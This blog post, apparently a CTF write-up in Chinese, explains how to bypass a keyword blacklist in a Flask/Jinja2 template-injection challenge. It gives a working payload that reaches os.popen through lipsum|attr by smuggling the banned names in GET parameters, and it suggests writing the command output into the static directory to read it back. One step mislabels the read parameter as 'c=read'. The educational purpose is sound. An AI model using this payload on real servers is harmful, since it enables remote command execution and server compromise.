---
title: Jinja2常见关键字被ban后的SSTI
date: 2026-04-11
tags: [SSTI专题]
categories: 
  - web安全
  - Python安全
excerpt: 比赛中__class__等关键字被ban的SSTI
---

# Jinja2常见关键字被ban后的SSTI

## 题目源码

```python
from flask import Flask,render_template_string,request,render_template
app=Flask(__name__)
@app.route('/',methods=['GET','POST'])
def index():
	black_list=['__class__','__init__','7','*','import','os','popen','__','system']
	if request.method=='POST':
		name=request.form.get('name')
		for black in black_list:
			if black in name:
				return "waf!"
		result=render_template_string(name)
		return 'ok'
	return render_template('index.html')
if __name__=='__main__':
	app.run(host='0.0.0.0',port=5000)
```

题目给的源码很简单，只是给了一个黑名单，把常见的SSTI所用的关键字给ban了，但是这里只检查POST请求体name参数是否有非法字符，如果我们把这些敏感字符放在GET参数里面，然后在POST请求体里面用`request.args`获取GET参数即可绕过。

## payload

```python
POST: {{(((lipsum|attr(request.args.g))|attr(request.args.gi)(request.args.o))|attr(request.args.p)(request.args.c))|attr(request.args.r)()}}
GET:  g=__globals__&gi=__getitem__&o=os&p=popen&c=命令&r=read
```

### payload讲解

`lipsum`：Jinja2内置的全局函数，是一个python函数对象。

`|attr(...)`：Jinja2的过滤器，作用相当于`getattr(object, attribute_name)`，用来获取对象的属性或方法名。

`request.args.xxx`：从GET参数中取值。

#### 第一步：获取`lipsum`的`__globals__`

```python
lipsum|attr(request.args.g)
```

##### 基本语法

```python
{{ object|attr("attribute_name") }}
```

在jinja2模板中，通常使用`.`来访问属性，但有局限性：

1. 不能使用变量作为属性名
2. 不能访问名称中包含特殊字符的属性

这样我们就能获取到`lipsum`函数对象的g属性(g是我们可以控制的，由GET参数决定)。如果我们在GET参数中带上`?g=__globals__`，我们就能获取`lipsum.__globals__`这个字典。

#### 第二步：从`__globals__`中获取某个成员

```python
(lipsum|attr(request.args.g))|attr(request.args.gi)(request.args.o)
```

##### 语法分解

第一部分：`|attr(request.args.gi)`

这是获取`lipsum.__globals__`返回的字典对象的方法。

第二部分：`(request.args.o)`

这是调用这个方法，并传入参数。

此时如果我们传参：`gi=__getitem__&o=os`，就能获取到Jinja2内部导入的os模块了。

#### 第三步：从`os`模块中获取`popen`

```python
( ...上一步结果... )|attr(request.args.p)(request.args.c)
```

上一步我们获取到os模块之后开始调用os模块的popen函数并执行命令，返回命令执行得到的对象。

#### 第四步：调用`read()`读取

```python
( ...上一步结果... )|attr(request.args.r)()
```

此时我们传参`c=read`即可读取命令执行内容。

## 回显

这里题目源码只给了`return 'ok'`，所以我们可以尝试将flag写入Flask的static目录然后访问该文件来获取flag。

然后在部分环境内static目录可能不存在，需要先`mkdir -p static`创建，然后将flag写入文件。



















